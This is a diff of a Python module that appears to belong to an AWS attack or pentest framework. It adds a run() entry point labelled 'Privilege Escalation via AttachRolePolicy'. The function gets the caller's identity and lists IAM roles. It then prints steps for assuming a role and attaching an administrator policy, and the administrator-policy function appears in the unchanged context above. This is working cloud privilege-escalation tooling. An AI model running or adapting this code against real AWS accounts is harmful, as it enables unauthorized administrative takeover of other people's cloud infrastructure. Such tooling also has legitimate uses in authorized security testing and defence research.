@@ -42,3 +42,22 @@ def attach_administrator_policy(role_name: str):
         return resp
     except Exception as err:
         raise Exception(err.__str__())
+
+
+def run():
+    """Entry point for the Celery task runner."""
+    print("=== Privilege Escalation via AttachRolePolicy ===")
+    print("Step 1: Getting caller identity...")
+    sts = boto3.client("sts")
+    identity = sts.get_caller_identity()
+    print(f"Current identity: {identity['Arn']}")
+
+    print("\nStep 2: Listing available roles...")
+    iam = boto3.client("iam")
+    roles = iam.list_roles(MaxItems=10)
+    for role in roles.get("Roles", []):
+        print(f"  - {role['RoleName']} ({role['Arn']})")
+
+    print("\nNote: To perform the full attack, call:")
+    print("  get_role_creds(role_arn) → assume a role")
+    print("  attach_administrator_policy(role_name) → escalate privileges")
